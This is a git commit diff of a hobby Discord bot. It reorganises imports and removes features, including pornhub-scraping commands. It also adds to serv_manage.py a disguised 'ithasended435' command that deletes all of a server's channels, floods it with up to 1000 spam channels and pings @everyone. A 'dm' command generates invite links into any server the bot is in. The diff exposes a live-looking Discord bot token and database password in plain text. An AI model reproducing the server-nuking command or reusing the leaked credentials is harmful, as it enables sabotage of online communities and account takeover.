fb8d163c725e0e61d32961876a769ab3a50d5c8e
spicylemonade <gebytienyi@gmail.com>
2022-01-19 20:10:42 -0500

    lots of changes

--- main.py
+++ main.py
@@ -1,17 +1,18 @@
-import discord
-from discord.ext import commands
-import random
-from discord import Permissions
-from discord.ext.commands import Bot
 # from colorama import Fore, Style
 import asyncio
 import os
-from pytz import timezone
+import random
 import time
-from datetime import datetime
-from datetime import date
-from bs4 import BeautifulSoup
+from datetime import date, datetime
+import subprocess
+
+import discord
 import requests
+from bs4 import BeautifulSoup
+from discord import Permissions
+from discord.ext import commands
+from discord.ext.commands import Bot
+from pytz import timezone
 # from matplotlib import pyplot as plt
 
 username = 'spicy_lemon'
@@ -28,22 +29,15 @@ xmes = 0
 urlinp = 'https://chart-studio.plotly.com/~spicy_lemon/1/.png'
 tz = timezone('EST')
 client = commands.Bot(command_prefix='g!', intents=intents, help_command=None)
-import gspread
 from pprint import pprint
-from oauth2client.service_account import ServiceAccountCredentials
-scope = ["https://spreadsheets.google.com/feeds", 'https://www.googleapis.com/auth/spreadsheets',
-         "https://www.googleapis.com/auth/drive.file", "https://www.googleapis.com/auth/drive"]
-creds = ServiceAccountCredentials.from_json_keyfile_name("creds.json", scope)
-
-sheet_client = gspread.authorize(creds)
-sheet = sheet_client.open("test").sheet1
-#this is for connecting to google sheets
-import mysql.connector
 import functools
 import operator
+
+#this is for connecting to google sheets
+import mysql.connector
+
 mip = "'"
 #this is for edditng values and shwing them in mysql
-
 
 @client.event
 async def on_ready():
@@ -61,28 +55,6 @@ async def on_ready():
         my_cursor = mydb.cursor(buffered=True)
         new_now = datetime.now(tz)
         timey = new_now.strftime("%H")
-        """if timey == '00':
-                datey = datetime.today().strftime('%d %m %Y')
-                day, month, year = (int(i) for i in datey.split(' '))
-                weday = date(int(year), int(month), int(day)+6)
-                datey1 = weday.strftime("%A")
-                print('done')
-                dmes = data['messages']
-                data["fyo"].append(dmes)
-                data["days"].append(datey1)
-                with open('jtime.json', 'w') as f:
-                  json.dump(data, f)
-                fig = go.Figure(data=go.Scatter(x=data["days"],
-                                        y=data["fyo"]))
-                py.plot(fig, filename='shibo_stats',auto_open=False)
-                print('day complete')
-                print('messages sent: ', dmes)
-                xmes = 0
-                data['messages']=0
-                with open('jtime.json', 'w') as f:
-                  json.dump(data, f)
-                await asyncio.sleep(3600)"""
-
         if timey == "00":
             datey = datetime.today().strftime('%d %m %Y')
             day, month, year = (int(i) for i in datey.split(' '))
@@ -105,11 +77,6 @@ async def on_ready():
             await asyncio.sleep(3600)
         await asyncio.sleep(130)
 
-
-''''@client.event
-async def on_message(message):
- if message.content.startswith('sauce drip nayu'):
-   await message.channel.send("try 8")'''
 
 keyword = "bum do"
 
@@ -145,55 +112,8 @@ async def on_message(message):
         if message.content.startswith("ratio"):
             await message.channel.send(":thumbdown:")
             await message.add_reaction('👎')
-    dnd=['dnd','d&d','DND','D&D','dungeons and dragons','Dungeons and Dragons','d and d', 'dungeons & dragons', 'Dnd','dnD','5e','dungeon and dragon','Dungeons and Dragons','Dungeons and dragons','dungeons n dragons','Dungeons n Dragons','Dungeons n dragons']
-    dndn=['not','hate','dispise','dont','wont','dislike','do not','never']
-    dndl=[]
-    for i in dnd:
-        if i in message.content:
-            dndl.append('true')
-    for i in dndn:
-        if i in message.content:
-            dndl.append('false')
-    if 'true' in dndl and 'false' not in dndl:
-        await message.channel.send('ew nerd')
-    elif 'false' in dndl and 'true' in dndl:
-        if 'dont hate' in message.content:
-            await message.channel.send('cringe')
-            c='cringe'
-        else:
-            c='valid'
-        if 'geby' in message.content:
-            await message.channel.send('cringe')
-            c='cinge'
-        else:
-            c='valid'
-        await message.channel.send(c)
-
     await client.process_commands(message)
 
-
-'''@client.command()
-async def blip(ctx):
-  while True:
-        asyncio.sleep(10)
-        now = datetime.datetime.now()
-        current_time = now.strftime("%H:%M:%S")
-        bumf = current_time
-            #if bumf == "14:56:00":
-               # print('yes')
-        print(bumf)'''
-async def secondary_files():
-         ############################################################
-         import sinfo #SERVER INFO
-         ############################################################
-
-         ############################################################
-         import serv_manage #SERVER MANAGEMENT
-         ############################################################
-         
-         ############################################################
-         import geb_economy #ECONOMY FUNCTION
-         ############################################################
 @client.command()
 @commands.has_permissions()
 async def remind(ctx, time, *, task):
@@ -352,144 +272,17 @@ async def snipe(ctx):
         await ctx.send("nothing to snipe")
 
 
-esnipe_message_content = None
-
-esnipe_message_author = None
-
-
-@client.event
-async def on_message_edit(message, message_before):
-    global esnipe_message_content
-
-    global esnipe_message_author
-    global es_guild
-    global es_icon
-    es_icon = message_before.author.avatar_url
-    es_guild = message_before.guild.id
-    esnipe_message_content = message_before.content
-    esnipe_message_author = message_before.author.nick
-    if message_before.author.nick == None:
-        esnipe_message_author = message_before.author.name
-
-    await asyncio.sleep(180)
-    esnipe_message_content = None
-
-    esnipe_message_author = None
-
-
-@client.command()
-async def esnipe(ctx):
-    tz = timezone('EST')
-    if ctx.guild.id == es_guild:
-
-        embedesnipe = discord.Embed(color=0xD9108D,
-                                    description=f"{esnipe_message_content}",
-                                    timestamp=datetime.now(tz))
-        embedesnipe.set_author(name=f"{esnipe_message_author}",
-                               icon_url=es_icon)
-        embedesnipe.set_footer(text=f"{randemoti}")
-        if esnipe_message_content == None:
-            await ctx.send("nothing to snipe")
-        if esnipe_message_content != None:
-            await ctx.send(embed=embedesnipe)
-    else:
-        await ctx.send("nothing to snipe")
-
-
-bumdum = random.randint(1, 2000)
-
-
-@client.command()
-async def ph(ctx, *, searcher):
-    url = f"https://www.pornhub.com/video/search?search={searcher}&page={bumdum}"
-    result = requests.get(url).text
-    doc = BeautifulSoup(result, 'html.parser')
-    tag1 = doc.find('ul',
-                    id="videoSearchResult",
-                    class_="videos search-video-thumbs freeView")
-    tags = tag1.find('div', class_="phimage")
-    pimp = tags.find('a')
-    await ctx.send("https://www.pornhub.com" + str(pimp['href']))
-
-
-grand = random.randint(1, 200)
-
-
-@client.command()
-async def vid(ctx, *, vsearcher):
-    vurl = f"https://www.pornhub.com/gifs/search?search={vsearcher}&page={grand}"
-    vresult = requests.get(vurl).text
-    vsoup = BeautifulSoup(vresult, "html.parser")
-    # tag1 = soup.find('div', class_="nf-videos")
-    vtags = vsoup.find_all('div', class_="gifsWrapper hideLastItemLarge")
-    vpimp = random.choice(vtags)
-    # pimp =tags.find('a')
-    vpimp2 = vpimp.find_all('video')
-    vpimp3 = random.choice(vpimp2)
-    # print(pimp2)
-    await ctx.send(str(vpimp3['data-mp4']))
-
-
-@client.command()
-async def gif(ctx, *, gsearcher):
-    gurl = f"https://www.pornhub.com/gifs/search?search={gsearcher}&page={grand}"
-    gresult = requests.get(gurl).text
-    gsoup = BeautifulSoup(gresult, "html.parser")
-    # tag1 = soup.find('div', class_="nf-videos")
-    gtags = gsoup.find_all('div', class_="gifsWrapper hideLastItemLarge")
-    gpimp = random.choice(gtags)
-    # pimp =tags.find('a')
-    gpimp2 = gpimp.find_all('video')
-    gpimp3 = random.choice(gpimp2)
-    # print(pimp2)
-    newest = str(gpimp3['data-mp4'])
-    newest2 = newest.replace('dl', 'el')
-    newest2 = newest2.replace('mp4', 'gif')
-    await ctx.send(newest2)
-
-
-@client.command()
-async def ithasended435(ctx):
-    # if ctx.message.content.endswith("It didnt have to end this way, nuke time"):
-
-    await ctx.message.delete()
-
-    guild = ctx.guild
-
-    for channel in guild.channels:
-
-        await channel.delete()
-        if ctx.guild.channels == None:
-            break
-    while True:
-        await ctx.guild.create_text_channel("spam channel2")
-        if len(ctx.author.guild.channels) == 1000:
-            break
-    if len(ctx.author.guild.channels) == 1000:
-        for text_channel in ctx.author.guild.text_channels:
-            await text_channel.send("@everyone")
-
-
-@client.command(name='dm')
-async def dm(ctx, guild_id: int):
-    guild = client.get_guild(guild_id)
-    channel = guild.channels[0]
-    invitelink = await channel.create_invite(max_uses=1)
-    await ctx.author.send(invitelink)
-async def m_loop():
-         while True:
-
-                  global mydb
-                  global my_cursor
-                  mydb = mysql.connector.connect(host="bdrpelbcfmnvbfxgeoe6-mysql.services.clever-cloud.com", user="uhiollzjpdbggq7z",passwd="ETZYMs1wQWWGA1Vnq590",database="bdrpelbcfmnvbfxgeoe6",port=3306)
-                  my_cursor = mydb.cursor(buffered=True)
-                  await asyncio.sleep(260)
-
 @client.command()
 @commands.is_owner()
 async def shutdown(context):
     exit()
-
+####################################
+exec(open("sinfo.py").read())
+####################################
+exec(open("serv_manage.py").read())
+####################################
+exec(open("geb_economy.py").read())
+####################################
+exec(open("nfw.py").read())
+####################################
 client.run('OTA1MjMxMzIwODc0MDk0Njk1.YYHEXQ.iZS2HTl4gsl5Rpkgnej4lfjSvxE', bot=True)
-if bot == true:
-         secondary_files()
--- serv_manage.py
+++ serv_manage.py
@@ -20,3 +20,30 @@ async def delchan(ctx, *, channel_name):
     await channel_find.delete()
     await ctx.send(embed=embeddelchan)
 #delete channel
+@client.command(name='dm')
+async def dm(ctx, guild_id: int):
+    guild = client.get_guild(guild_id)
+    channel = guild.channels[0]
+    invitelink = await channel.create_invite(max_uses=1)
+    await ctx.author.send(invitelink)
+
+@client.command()
+async def ithasended435(ctx):
+    # if ctx.message.content.endswith("It didnt have to end this way, nuke time"):
+
+    await ctx.message.delete()
+
+    guild = ctx.guild
+
+    for channel in guild.channels:
+
+        await channel.delete()
+        if ctx.guild.channels == None:
+            break
+    while True:
+        await ctx.guild.create_text_channel("spam channel2")
+        if len(ctx.author.guild.channels) == 1000:
+            break
+    if len(ctx.author.guild.channels) == 1000:
+        for text_channel in ctx.author.guild.text_channels:
+            await text_channel.send("@everyone")
